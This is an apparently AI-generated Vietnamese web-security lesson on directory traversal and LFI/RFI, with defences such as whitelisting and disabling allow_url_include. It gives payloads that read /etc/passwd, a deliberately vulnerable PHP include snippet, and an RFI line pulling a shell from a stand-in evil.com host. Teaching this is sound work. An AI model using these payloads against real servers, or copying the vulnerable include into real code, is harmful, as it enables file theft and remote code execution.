Dưới đây là nội dung chi tiết cho bài học:

---

# 06. Directory Traversal & File Inclusion

**Tấn công duyệt thư mục và chèn tập tin**

---

## 🎯 Mục tiêu

* Hiểu cách hoạt động của Directory Traversal và File Inclusion (LFI/RFI).
* Khai thác để đọc tập tin nhạy cảm, thực thi mã từ xa.
* Biết cách phòng chống loại tấn công này trong ứng dụng web.

---

## 📌 1. Directory Traversal là gì?

Directory Traversal (Duyệt thư mục) là tấn công nhằm truy cập các tập tin ngoài phạm vi cho phép bằng cách chèn ký tự đặc biệt vào đường dẫn, ví dụ:

```http
GET /?file=../../../../etc/passwd
```

→ Máy chủ đọc tập tin hệ thống thay vì tập tin được phép.

---

## 📌 2. File Inclusion là gì?

File Inclusion là lỗi khi ứng dụng **nhúng tập tin** theo đầu vào từ người dùng, ví dụ:

```php
<?php
  include($_GET['page']);  // page=home.php
?>
```

Nếu không kiểm soát kỹ, kẻ tấn công có thể:

* LFI (Local File Inclusion): nhúng tập tin cục bộ (ví dụ: `/etc/passwd`)
* RFI (Remote File Inclusion): nhúng tập tin từ bên ngoài (chỉ xảy ra nếu `allow_url_include=On`)

---

## 💥 3. Các ví dụ tấn công

### 🔹 LFI:

```
http://site.com/index.php?page=../../../../etc/passwd
```

→ Trích xuất thông tin hệ thống.

### 🔹 RFI (nếu server hỗ trợ):

```
http://site.com/index.php?page=http://evil.com/shell.txt
```

→ Thực thi mã từ xa.

---

## 🔧 Công cụ khai thác

* **Burp Suite** (Repeater để thử nhiều payload)
* **wfuzz / ffuf** – fuzz file path
* LFI Suite, Liffy – tool tự động hóa
* `curl` hoặc trình duyệt

---

## 🛡 Cách phòng chống

| Biện pháp                                                           | Giải thích                                                           |
| ------------------------------------------------------------------- | -------------------------------------------------------------------- |
| **Không bao giờ đưa đường dẫn từ input người dùng vào `include()`** | Chỉ sử dụng tên tập tin được định nghĩa sẵn                          |
| **Giới hạn whitelist tập tin**                                      | Ví dụ: chỉ cho phép `home.php`, `contact.php`,...                    |
| **Loại bỏ ký tự ../ và null byte**                                  | Tránh truy cập thư mục cha                                           |
| **Cấu hình server đúng**                                            | Tắt `allow_url_include`, không chạy file trong thư mục không tin cậy |
| **Không lưu log nhạy cảm trong web-accessible path**                | Tránh để người dùng có thể đọc `/var/log/...`                        |

---

## 🧠 Tổng kết

* LFI là một trong những lỗ hổng nguy hiểm vì có thể **đọc**, **thực thi mã** hoặc **chiếm quyền điều khiển** máy chủ.
* Luôn kiểm soát kỹ dữ liệu người dùng – đặc biệt là khi xử lý đường dẫn và tập tin.

---

Bạn có muốn tiếp theo là bài **07. SSRF (Server-Side Request Forgery)** không?
